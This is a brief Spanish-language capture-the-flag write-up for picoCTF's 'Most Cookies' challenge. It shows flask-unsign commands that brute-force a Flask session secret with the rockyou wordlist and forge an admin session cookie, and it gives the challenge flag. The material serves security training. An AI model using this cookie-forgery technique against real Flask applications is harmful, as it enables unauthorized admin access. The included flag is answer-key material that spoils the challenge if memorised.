# Reto: Most Cookies

## Descripción

Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

## Solución

Se necesitó usar la herramienta `flask-unsign` para este reto.

Primero, intentábamos crackear la contraseña por fuerza bruta:
```bash
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.abjHUQ.LDF9Z20Kzd66GoAmxNCLOdwAUOs" --wordlist ~/wordlists/rockyou.txt --no-literal-eval
# b'butter'
```

Una vez obtenida la contraseña `butter`, la utilizábamos para crear una cookie que nos hiciera pasar por admin:
```bash
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "butter"
# eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.abjfLw.ZC2SPpF_P9-eG9Kp5W6BJxFUVbU
```

Actualizábamos la cookie a la que acabábamos de crear y recargábamos la página.

`picoCTF{cO0ki3s_yum_b8a89e75}`
